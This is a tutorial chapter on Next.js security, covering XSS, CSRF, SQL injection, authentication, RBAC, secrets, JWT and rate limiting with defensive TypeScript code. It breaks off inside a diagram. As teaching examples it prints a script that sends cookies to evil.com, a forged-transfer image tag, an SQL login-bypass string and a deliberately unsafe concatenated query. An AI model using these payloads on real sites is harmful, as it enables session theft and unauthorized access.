---
title: "Next.js Security & Advanced Concepts"
description: "Advanced Next.js guide covering application security, secure authentication, headers, rate limiting, server actions, advanced routing, and production patterns."
---

# Next.js Complete Guide â€” Part 5A
## Sections 21â€“22: Security Best Practices Â· Advanced Next.js Concepts

> **Series:** Next.js App Router (v14+) Â· TypeScript Â· Production-Ready
> **Level:** Beginner-friendly with production-level depth

---

## Table of Contents

- [Section 21: Security Best Practices](#section-21-security-best-practices)
- [Section 22: Advanced Next.js Concepts](#section-22-advanced-nextjs-concepts)
- [Summary & Key Takeaways](#summary)
- [Practice Exercises](#practice-exercises)
- [Mini Project Ideas](#mini-project-ideas)
- [Interview Preparation](#interview-preparation)

---

# Section 21: Security Best Practices

## 21.1 What Is Application Security?

Application security is the practice of **protecting your web application from malicious actors** who attempt to steal data, impersonate users, crash services, or gain unauthorized access. In Next.js, security spans the entire stack â€” from the browser to the server to the database.

> **Simple analogy:** Think of your application as a bank vault. The vault door (authentication), the security cameras (logging), the guards (middleware), and the alarm system (rate limiting) all work together. Neglecting any single layer puts everything at risk.

---

## 21.2 Why Security Matters

| Risk | Consequence Without Security |
|------|------------------------------|
| **Data breach** | User passwords, credit cards, PII exposed |
| **Account takeover** | Users impersonated, trust destroyed |
| **Service disruption** | App made unavailable via DDoS |
| **Legal liability** | GDPR fines, lawsuits, regulatory penalties |
| **Reputation damage** | Users leave, business suffers permanently |

---

## 21.3 Common Vulnerability Landscape

```txt
<svg viewBox="0 0 760 420" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="760" height="420" rx="16" fill="#0f172a"/>
  <text x="380" y="34" text-anchor="middle" fill="#f1f5f9" font-size="17" font-weight="700">Web Application Attack Surface</text>

  <!-- Central App box -->
  <rect x="290" y="170" width="180" height="80" rx="12" fill="#1e40af" stroke="#3b82f6" stroke-width="2"/>
  <text x="380" y="205" text-anchor="middle" fill="#dbeafe" font-size="13" font-weight="700">Next.js App</text>
  <text x="380" y="225" text-anchor="middle" fill="#93c5fd" font-size="10">Your Production Server</text>
  <text x="380" y="240" text-anchor="middle" fill="#93c5fd" font-size="10">API + UI + Database</text>

  <!-- XSS -->
  <rect x="30" y="55" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="100" y="77" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">XSS</text>
  <text x="100" y="95" text-anchor="middle" fill="#fca5a5" font-size="10">Script injection</text>
  <text x="100" y="108" text-anchor="middle" fill="#fca5a5" font-size="9">via user input</text>
  <line x1="170" y1="82" x2="290" y2="190" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- CSRF -->
  <rect x="30" y="165" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="100" y="187" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">CSRF</text>
  <text x="100" y="205" text-anchor="middle" fill="#fca5a5" font-size="10">Forged requests</text>
  <text x="100" y="218" text-anchor="middle" fill="#fca5a5" font-size="9">from other origins</text>
  <line x1="170" y1="192" x2="290" y2="205" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- SQL Injection -->
  <rect x="30" y="275" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="100" y="297" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">SQL Injection</text>
  <text x="100" y="315" text-anchor="middle" fill="#fca5a5" font-size="10">Malicious DB queries</text>
  <text x="100" y="328" text-anchor="middle" fill="#fca5a5" font-size="9">via unsanitized input</text>
  <line x1="170" y1="302" x2="290" y2="225" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Auth Attacks -->
  <rect x="590" y="55" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="660" y="77" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">Auth Attacks</text>
  <text x="660" y="95" text-anchor="middle" fill="#fca5a5" font-size="10">Brute force / stuffing</text>
  <text x="660" y="108" text-anchor="middle" fill="#fca5a5" font-size="9">Weak passwords</text>
  <line x1="590" y1="82" x2="470" y2="190" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Token Leakage -->
  <rect x="590" y="165" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="660" y="187" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">Token Leakage</text>
  <text x="660" y="205" text-anchor="middle" fill="#fca5a5" font-size="10">Exposed JWT / API keys</text>
  <text x="660" y="218" text-anchor="middle" fill="#fca5a5" font-size="9">in client code</text>
  <line x1="590" y1="192" x2="470" y2="205" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Session Hijacking -->
  <rect x="590" y="275" width="140" height="55" rx="8" fill="#7f1d1d"/>
  <text x="660" y="297" text-anchor="middle" fill="#fecaca" font-size="12" font-weight="700">Session Hijack</text>
  <text x="660" y="315" text-anchor="middle" fill="#fca5a5" font-size="10">Stolen cookies</text>
  <text x="660" y="328" text-anchor="middle" fill="#fca5a5" font-size="9">via network sniff</text>
  <line x1="590" y1="302" x2="470" y2="225" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#atk)"/>

  <!-- Rate Limiting (protection) -->
  <rect x="270" y="350" width="220" height="50" rx="8" fill="#065f46" stroke="#10b981" stroke-width="1.5"/>
  <text x="380" y="371" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="700">ðŸ›¡ Defense Layers</text>
  <text x="380" y="389" text-anchor="middle" fill="#34d399" font-size="10">Rate limiting Â· CSP Â· HTTPS Â· Input validation</text>

  <line x1="380" y1="350" x2="380" y2="250" stroke="#10b981" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#def)"/>

  <defs>
    <marker id="atk" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#f87171"/>
    </marker>
    <marker id="def" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#10b981"/>
    </marker>
  </defs>
</svg>
```

---

## 21.4 XSS â€” Cross-Site Scripting

**What it is:** An attacker injects malicious JavaScript into your page through user-controlled content (comments, form fields, URL params). When another user views the page, the script executes in their browser.

**Example attack:**
```html
<!-- Attacker submits this as their "name" -->
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Prevention in Next.js:**

Next.js (via React) **automatically escapes** JSX expressions, making it resistant to XSS by default. However, danger exists when using `dangerouslySetInnerHTML`.

```tsx
// app/components/Comment.tsx

// âŒ DANGEROUS â€” Raw HTML injection
function DangerousComment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// âœ… SAFE â€” React escapes automatically
function SafeComment({ content }: { content: string }) {
  return <div>{content}</div>;
}

// âœ… SAFE â€” Sanitize when you MUST use raw HTML (e.g., rich text editors)
import DOMPurify from 'isomorphic-dompurify';

function SanitizedContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Content Security Policy (CSP) header:**

```tsx
// next.config.js â€” Add CSP headers
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' blob: data: https:;
  font-src 'self';
  connect-src 'self' https://api.yourdomain.com;
  frame-ancestors 'none';
`.replace(/\n/g, '');

/** @type {import('next').NextConfig} */
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: cspHeader,
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
        ],
      },
    ];
  },
};

module.exports = nextConfig;
```

---

## 21.5 CSRF â€” Cross-Site Request Forgery

**What it is:** A malicious website tricks a logged-in user's browser into making a request to your app â€” submitting a form, deleting data â€” without the user's knowledge.

**Example attack:**
```html
<!-- On attacker's website -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000" />
<!-- Browser sends the victim's cookies automatically! -->
```

**Prevention:**

```ts
// middleware.ts â€” Validate Origin header for mutations
import { NextRequest, NextResponse } from 'next/server';

export function middleware(request: NextRequest) {
  // Only check state-changing methods
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(request.method)) {
    const origin = request.headers.get('origin');
    const allowedOrigin = process.env.NEXTAUTH_URL;

    if (origin && origin !== allowedOrigin) {
      return NextResponse.json(
        { error: 'Forbidden: Invalid origin' },
        { status: 403 }
      );
    }
  }
  return NextResponse.next();
}

export const config = {
  matcher: '/api/:path*',
};
```

```tsx
// For forms â€” use SameSite cookies + CSRF token
// app/api/auth/[...nextauth]/route.ts
// NextAuth sets cookies with SameSite=lax by default
// For extra protection, use CSRF tokens:

import { randomBytes } from 'crypto';
import { cookies } from 'next/headers';

export async function generateCsrfToken(): Promise<string> {
  const token = randomBytes(32).toString('hex');
  cookies().set('csrf-token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/',
  });
  return token;
}

export function validateCsrfToken(requestToken: string): boolean {
  const storedToken = cookies().get('csrf-token')?.value;
  return !!storedToken && storedToken === requestToken;
}
```

---

## 21.6 SQL Injection

**What it is:** Attackers insert SQL code into user inputs to manipulate your database queries.

**Example attack:**
```sql
-- User enters: admin' --
SELECT * FROM users WHERE email = 'admin' --' AND password = 'anything'
-- The -- comments out the password check entirely!
```

**Prevention â€” Always use parameterized queries:**

```ts
// app/api/users/route.ts

// âŒ NEVER DO THIS â€” string concatenation
async function dangerousQuery(email: string) {
  // SQL injection possible!
  return db.execute(`SELECT * FROM users WHERE email = '${email}'`);
}

// âœ… ALWAYS use parameterized queries or an ORM
import { db } from '@/lib/db'; // e.g., Drizzle, Prisma, Postgres.js

// Option 1: Parameterized query (raw SQL)
async function safeQuery(email: string) {
  return db.execute('SELECT * FROM users WHERE email = $1', [email]);
}

// Option 2: ORM (Prisma) â€” safe by default
import { prisma } from '@/lib/prisma';

async function findUser(email: string) {
  return prisma.user.findUnique({
    where: { email }, // Prisma handles escaping automatically
  });
}

// Option 3: Drizzle ORM
import { users } from '@/db/schema';
import { eq } from 'drizzle-orm';

async function findUserDrizzle(email: string) {
  return db.select().from(users).where(eq(users.email, email));
}
```

---

## 21.7 Authentication Security

### Password Hashing

```ts
// lib/auth/password.ts
import bcrypt from 'bcryptjs';

const SALT_ROUNDS = 12; // Higher = slower but more secure

export async function hashPassword(plaintext: string): Promise<string> {
  // bcrypt automatically generates a salt and hashes
  return bcrypt.hash(plaintext, SALT_ROUNDS);
}

export async function verifyPassword(
  plaintext: string,
  hashed: string
): Promise<boolean> {
  // Constant-time comparison prevents timing attacks
  return bcrypt.compare(plaintext, hashed);
}
```

### Secure Login API Route

```ts
// app/api/auth/login/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';
import { prisma } from '@/lib/prisma';
import { verifyPassword } from '@/lib/auth/password';
import { createSession } from '@/lib/auth/session';
import { rateLimit } from '@/lib/rate-limit';

const LoginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(100),
});

export async function POST(request: NextRequest) {
  // 1. Rate limiting â€” prevent brute force
  const ip = request.ip ?? '127.0.0.1';
  const { success } = await rateLimit.check(ip, 5); // 5 attempts per minute

  if (!success) {
    return NextResponse.json(
      { error: 'Too many attempts. Please try again later.' },
      { status: 429 }
    );
  }

  try {
    // 2. Validate input
    const body = await request.json();
    const parsed = LoginSchema.safeParse(body);

    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid input' }, { status: 400 });
    }

    const { email, password } = parsed.data;

    // 3. Find user â€” use generic error message (don't reveal if email exists)
    const user = await prisma.user.findUnique({ where: { email } });

    // âœ… Constant-time check even when user doesn't exist (prevents enumeration)
    const passwordMatch = user
      ? await verifyPassword(password, user.passwordHash)
      : await verifyPassword(password, '$2b$12$fakehashfortimingnormalization');

    if (!user || !passwordMatch) {
      return NextResponse.json(
        { error: 'Invalid email or password' }, // Generic message
        { status: 401 }
      );
    }

    // 4. Create session
    const session = await createSession(user.id);

    const response = NextResponse.json({ success: true });

    // 5. Set secure HTTP-only cookie
    response.cookies.set('session', session.token, {
      httpOnly: true,       // Not accessible via JavaScript
      secure: true,         // HTTPS only
      sameSite: 'lax',      // CSRF protection
      maxAge: 60 * 60 * 24 * 7, // 7 days
      path: '/',
    });

    return response;

  } catch (error) {
    console.error('[Login Error]', error);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
```

---

## 21.8 Authentication Security Flow Diagram

```txt
<svg viewBox="0 0 720 460" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="720" height="460" rx="14" fill="#0f172a"/>
  <text x="360" y="32" text-anchor="middle" fill="#f1f5f9" font-size="16" font-weight="700">Secure Authentication Flow</text>

  <!-- User -->
  <rect x="20" y="65" width="110" height="50" rx="8" fill="#1e3a5f"/>
  <text x="75" y="87" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="600">User</text>
  <text x="75" y="103" text-anchor="middle" fill="#93c5fd" font-size="10">POST /api/login</text>

  <line x1="130" y1="90" x2="165" y2="90" stroke="#475569" stroke-width="1.5" marker-end="url(#sf1)"/>

  <!-- Rate Limiter -->
  <rect x="165" y="65" width="120" height="50" rx="8" fill="#312e81"/>
  <text x="225" y="87" text-anchor="middle" fill="#c4b5fd" font-size="12" font-weight="600">Rate Limiter</text>
  <text x="225" y="103" text-anchor="middle" fill="#a78bfa" font-size="10">5 req/min per IP</text>

  <!-- Rate limit fail -->
  <line x1="225" y1="115" x2="225" y2="155" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#sf2)"/>
  <rect x="165" y="155" width="120" height="40" rx="6" fill="#7f1d1d"/>
  <text x="225" y="171" text-anchor="middle" fill="#fecaca" font-size="10" font-weight="600">429 Too Many</text>
  <text x="225" y="186" text-anchor="middle" fill="#fca5a5" font-size="9">Requests</text>

  <!-- Pass -->
  <line x1="285" y1="90" x2="320" y2="90" stroke="#475569" stroke-width="1.5" marker-end="url(#sf1)"/>

  <!-- Input Validation -->
  <rect x="320" y="65" width="120" height="50" rx="8" fill="#1e40af"/>
  <text x="380" y="87" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="600">Validation</text>
  <text x="380" y="103" text-anchor="middle" fill="#93c5fd" font-size="10">Zod schema check</text>

  <!-- Validation fail -->
  <line x1="380" y1="115" x2="380" y2="155" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#sf2)"/>
  <rect x="320" y="155" width="120" height="40" rx="6" fill="#7f1d1d"/>
  <text x="380" y="171" text-anchor="middle" fill="#fecaca" font-size="10" font-weight="600">400 Bad Request</text>
  <text x="380" y="186" text-anchor="middle" fill="#fca5a5" font-size="9">Invalid input</text>

  <!-- Pass -->
  <line x1="440" y1="90" x2="475" y2="90" stroke="#475569" stroke-width="1.5" marker-end="url(#sf1)"/>

  <!-- DB Lookup + Hash verify -->
  <rect x="475" y="65" width="130" height="50" rx="8" fill="#1e40af"/>
  <text x="540" y="83" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">DB Lookup +</text>
  <text x="540" y="98" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="600">bcrypt.compare</text>
  <text x="540" y="112" text-anchor="middle" fill="#93c5fd" font-size="9">Constant-time check</text>

  <!-- Hash fail -->
  <line x1="540" y1="115" x2="540" y2="155" stroke="#f87171" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#sf2)"/>
  <rect x="475" y="155" width="130" height="40" rx="6" fill="#7f1d1d"/>
  <text x="540" y="171" text-anchor="middle" fill="#fecaca" font-size="10" font-weight="600">401 Unauthorized</text>
  <text x="540" y="186" text-anchor="middle" fill="#fca5a5" font-size="9">Generic error msg</text>

  <!-- Success path -->
  <line x1="540" y1="65" x2="540" y2="40" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>
  <text x="555" y="55" fill="#6ee7b7" font-size="10">PASS</text>

  <!-- Session creation -->
  <rect x="200" y="230" width="160" height="55" rx="8" fill="#065f46"/>
  <text x="280" y="252" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="600">Create Session</text>
  <text x="280" y="268" text-anchor="middle" fill="#34d399" font-size="10">Signed token</text>
  <text x="280" y="282" text-anchor="middle" fill="#34d399" font-size="9">DB record created</text>

  <!-- Arrow from hash pass to session -->
  <path d="M540 40 Q540 20 380 20 Q280 20 280 230" stroke="#34d399" stroke-width="1.5" fill="none" marker-end="url(#sf3)"/>

  <!-- Set cookie -->
  <rect x="380" y="230" width="200" height="55" rx="8" fill="#065f46"/>
  <text x="480" y="252" text-anchor="middle" fill="#6ee7b7" font-size="12" font-weight="600">Set Secure Cookie</text>
  <text x="480" y="268" text-anchor="middle" fill="#34d399" font-size="10">httpOnly Â· secure Â· sameSite</text>
  <text x="480" y="282" text-anchor="middle" fill="#34d399" font-size="9">maxAge: 7 days</text>

  <line x1="360" y1="257" x2="380" y2="257" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>

  <!-- 200 Response -->
  <rect x="250" y="325" width="260" height="45" rx="8" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1"/>
  <text x="380" y="347" text-anchor="middle" fill="#bfdbfe" font-size="12" font-weight="600">200 OK â€” Login Successful</text>
  <text x="380" y="362" text-anchor="middle" fill="#93c5fd" font-size="9">User redirected to dashboard</text>

  <line x1="480" y1="285" x2="420" y2="325" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>
  <line x1="280" y1="285" x2="340" y2="325" stroke="#34d399" stroke-width="1.5" marker-end="url(#sf3)"/>

  <!-- Audit log -->
  <rect x="200" y="390" width="360" height="40" rx="8" fill="#1e293b" stroke="#475569"/>
  <text x="380" y="408" text-anchor="middle" fill="#94a3b8" font-size="11" font-weight="600">Audit Log</text>
  <text x="380" y="423" text-anchor="middle" fill="#64748b" font-size="9">Login attempt (success/fail) Â· IP Â· Timestamp</text>

  <defs>
    <marker id="sf1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#475569"/>
    </marker>
    <marker id="sf2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#f87171"/>
    </marker>
    <marker id="sf3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#34d399"/>
    </marker>
  </defs>
</svg>
```

---

## 21.9 Authorization & Role-Based Access Control (RBAC)

```ts
// lib/auth/rbac.ts
export type Role = 'admin' | 'editor' | 'viewer';

export const permissions = {
  'admin':  ['read', 'write', 'delete', 'manage_users'],
  'editor': ['read', 'write'],
  'viewer': ['read'],
} as const;

type Permission = typeof permissions[Role][number];

export function hasPermission(role: Role, permission: Permission): boolean {
  return (permissions[role] as readonly string[]).includes(permission);
}
```

```ts
// middleware.ts â€” Route-level authorization
import { NextRequest, NextResponse } from 'next/server';
import { getSession } from '@/lib/auth/session';
import { hasPermission } from '@/lib/auth/rbac';

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  // Public routes â€” no auth needed
  const publicRoutes = ['/', '/login', '/register', '/api/auth'];
  if (publicRoutes.some(route => pathname.startsWith(route))) {
    return NextResponse.next();
  }

  // Verify session
  const session = await getSession(request);
  if (!session) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  // Admin-only routes
  if (pathname.startsWith('/admin') && session.role !== 'admin') {
    return NextResponse.redirect(new URL('/unauthorized', request.url));
  }

  // API route authorization
  if (pathname.startsWith('/api/admin') && !hasPermission(session.role, 'manage_users')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  // Attach user info to headers for server components
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-user-id', session.userId);
  requestHeaders.set('x-user-role', session.role);

  return NextResponse.next({ request: { headers: requestHeaders } });
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

---

## 21.10 Environment Variables & Secret Management

```bash
# .env.local â€” Local development secrets (NEVER commit)
DATABASE_URL=postgresql://user:pass@localhost:5432/mydb
JWT_SECRET=your-super-secret-jwt-key-min-32-chars
NEXTAUTH_SECRET=another-secret-for-nextauth
STRIPE_SECRET_KEY=sk_test_...
SENDGRID_API_KEY=SG....

# Public env vars (safe to expose to browser)
NEXT_PUBLIC_APP_URL=http://localhost:3000
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_test_...
```

```tsx
// lib/env.ts â€” Validate all required env vars at startup
import { z } from 'zod';

const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32, 'JWT_SECRET must be at least 32 characters'),
  NEXTAUTH_SECRET: z.string().min(32),
  NODE_ENV: z.enum(['development', 'test', 'production']),
  // Public vars
  NEXT_PUBLIC_APP_URL: z.string().url(),
});

// Throws at build time if any required env var is missing
const parsed = envSchema.safeParse(process.env);

if (!parsed.success) {
  console.error('âŒ Invalid environment variables:');
  console.error(parsed.error.flatten().fieldErrors);
  throw new Error('Invalid environment variables');
}

export const env = parsed.data;
```

**Critical rules:**
- âœ… Variables without `NEXT_PUBLIC_` prefix are **server-only** â€” never exposed to the browser
- âŒ Never put database URLs or API secrets in `NEXT_PUBLIC_` variables
- âœ… Use `.env.local` for local dev, CI/CD platform secrets for production
- âœ… Rotate secrets immediately if they are ever accidentally committed

---

## 21.11 JWT vs Session Security

| Aspect | JWT (JSON Web Token) | Server Sessions |
|--------|---------------------|-----------------|
| **Storage** | Client (cookie/localStorage) | Server (DB/Redis) |
| **Revocation** | Hard (need blocklist) | Easy (delete from DB) |
| **Scalability** | Excellent (stateless) | Requires shared store |
| **Token size** | Larger (~300 bytes) | Small (ID only) |
| **Expiry control** | Built-in `exp` claim | Full server control |
| **Security risk** | Token stolen = full access | Session ID stolen = risk |
| **Best for** | Microservices, APIs | Traditional web apps |

```ts
// lib/auth/jwt.ts
import { SignJWT, jwtVerify } from 'jose';

const secret = new TextEncoder().encode(process.env.JWT_SECRET);

export async function signToken(payload: Record<string, unknown>): Promise<string> {
  return new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('1h')        // Short expiry
    .setIssuer('https://yourdomain.com')
    .setAudience('https://yourdomain.com')
    .sign(secret);
}

export async function verifyToken(token: string) {
  const { payload } = await jwtVerify(token, secret, {
    issuer: 'https://yourdomain.com',
    audience: 'https://yourdomain.com',
  });
  return payload;
}
```

---

## 21.12 HTTP vs HTTPS Comparison

| Feature | HTTP | HTTPS |
|---------|------|-------|
| **Encryption** | âŒ None | âœ… TLS/SSL |
| **Data in transit** | Plaintext (readable) | Encrypted |
| **Cookie security** | Cookies can be stolen | `Secure` flag enforced |
| **MITM attacks** | Vulnerable | Protected |
| **Browser indicator** | âš ï¸ Not secure | ðŸ”’ Secure padlock |
| **SEO impact** | Penalized by Google | Rewarded |
| **Required for** | â€” | PWAs, Service Workers, HTTP/2 |

---

## 21.13 Rate Limiting

```ts
// lib/rate-limit.ts
import { LRUCache } from 'lru-cache';

type RateLimitOptions = {
  uniqueTokenPerInterval?: number;
  interval?: number; // milliseconds
};

export function rateLimiter(options: RateLimitOptions = {}) {
  const tokenCache = new LRUCache<string, number[]>({
    max: options.uniqueTokenPerInterval || 500,
    ttl: options.interval || 60_000, // 1 minute
  });

  return {
    check: (token: string, limit: number): { success: boolean; remaining: number } => {
      const tokenCount = tokenCache.get(token) ?? [];
      const now = Date.now();
      const windowStart = now - (options.interval || 60_000);

      // Filter out old requests
      const recentRequests = tokenCount.filter(t => t > windowStart);
      recentRequests.push(now);
      tokenCache.set(token, recentRequests);

      const remaining = Math.max(0, limit - recentRequests.length);
      return {
        success: recentRequests.length <= limit,
        remaining,
      };
    },
  };
}

// Usage in API route
const limiter = rateLimiter({ interval: 60_000, uniqueTokenPerInterval: 500 });

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for') ?? '127.0.0.1';
  const { success, remaining } = limiter.check(ip, 10);

  if (!success) {
    return Response.json(
      { error: 'Rate limit exceeded' },
      {
        status: 429,
        headers: {
          'Retry-After': '60',
          'X-RateLimit-Remaining': String(remaining),
        },
      }
    );
  }
  // ... handle request
}
```

---

## 21.14 Secure API Route Pattern

```ts
// app/api/posts/[id]/route.ts â€” Complete secure route example
import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth/options';
import { prisma } from '@/lib/prisma';
import { hasPermission } from '@/lib/auth/rbac';
import { rateLimiter } from '@/lib/rate-limit';

const limiter = rateLimiter({ interval: 60_000 });

const UpdatePostSchema = z.object({
  title: z.string().min(1).max(200).optional(),
  content: z.string().min(1).max(50_000).optional(),
});

export async function PATCH(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  // 1. Rate limiting
  const ip = request.headers.get('x-forwarded-for') ?? 'unknown';
  const { success } = limiter.check(ip, 20);
  if (!success) {
    return NextResponse.json({ error: 'Too many requests' }, { status: 429 });
  }

  // 2. Authentication
  const session = await getServerSession(authOptions);
  if (!session?.user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // 3. Authorization
  if (!hasPermission(session.user.role, 'write')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  // 4. Input validation
  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: 'Invalid JSON' }, { status: 400 });
  }

  const parsed = UpdatePostSchema.safeParse(body);
  if (!parsed.success) {
    return NextResponse.json(
      { error: 'Validation failed', details: parsed.error.flatten() },
      { status: 400 }
    );
  }

  // 5. Resource ownership check
  const post = await prisma.post.findUnique({ where: { id: params.id } });
  if (!post) {
    return NextResponse.json({ error: 'Not found' }, { status: 404 });
  }

  // Users can only edit their own posts (admins can edit any)
  if (post.authorId !== session.user.id && session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  // 6. Safe update
  const updated = await prisma.post.update({
    where: { id: params.id },
    data: parsed.data,
  });

  return NextResponse.json({ post: updated });
}
```

---

## 21.15 Request Security Workflow Diagram

```txt
<svg viewBox="0 0 700 340" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
  <rect width="700" height="340" rx="14" fill="#0f172a"/>
  <text x="350" y="28" text-anchor="middle" fill="#f1f5f9" font-size="15" font-weight="700">API Request Security Layers</text>

  <!-- Layers stacked vertically -->
  <!-- Layer 1: HTTPS -->
  <rect x="100" y="45" width="500" height="38" rx="8" fill="#065f46" stroke="#10b981" stroke-width="1"/>
  <text x="350" y="60" text-anchor="middle" fill="#6ee7b7" font-size="11" font-weight="700">Layer 1: HTTPS / TLS</text>
  <text x="350" y="75" text-anchor="middle" fill="#34d399" font-size="9">Encrypts data in transit Â· Prevents MITM Â· SSL certificate</text>

  <line x1="350" y1="83" x2="350" y2="95" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 2: CSP / Headers -->
  <rect x="100" y="95" width="500" height="38" rx="8" fill="#1e40af" stroke="#3b82f6" stroke-width="1"/>
  <text x="350" y="110" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">Layer 2: Security Headers</text>
  <text x="350" y="125" text-anchor="middle" fill="#93c5fd" font-size="9">CSP Â· X-Frame-Options Â· HSTS Â· Referrer-Policy</text>

  <line x1="350" y1="133" x2="350" y2="145" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 3: Rate Limit -->
  <rect x="100" y="145" width="500" height="38" rx="8" fill="#312e81" stroke="#6366f1" stroke-width="1"/>
  <text x="350" y="160" text-anchor="middle" fill="#c4b5fd" font-size="11" font-weight="700">Layer 3: Rate Limiting</text>
  <text x="350" y="175" text-anchor="middle" fill="#a78bfa" font-size="9">IP-based Â· Token-based Â· DDoS protection</text>

  <line x1="350" y1="183" x2="350" y2="195" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 4: Auth -->
  <rect x="100" y="195" width="500" height="38" rx="8" fill="#1e40af" stroke="#3b82f6" stroke-width="1"/>
  <text x="350" y="210" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">Layer 4: Authentication</text>
  <text x="350" y="225" text-anchor="middle" fill="#93c5fd" font-size="9">Session / JWT verification Â· Cookie validation</text>

  <line x1="350" y1="233" x2="350" y2="245" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Layer 5: Authz -->
  <rect x="100" y="245" width="500" height="38" rx="8" fill="#1e40af" stroke="#3b82f6" stroke-width="1"/>
  <text x="350" y="260" text-anchor="middle" fill="#bfdbfe" font-size="11" font-weight="700">Layer 5: Authorization</text>
  <text x="350" y="275" text-anchor="middle" fill="#93c5fd" font-size="9">Role check Â· Resource ownership Â· RBAC</text>

  <line x1="350" y1="283" x2="350" y2="295" stroke="#475569" stroke-width="1.5" marker-end="url(#rq1)"/>

  <!-- Core -->
  <rect x="200" y="295" width="300" height="35" rx="8" fill="#065f46" stroke="#10b981" stroke-width="1.5"/>
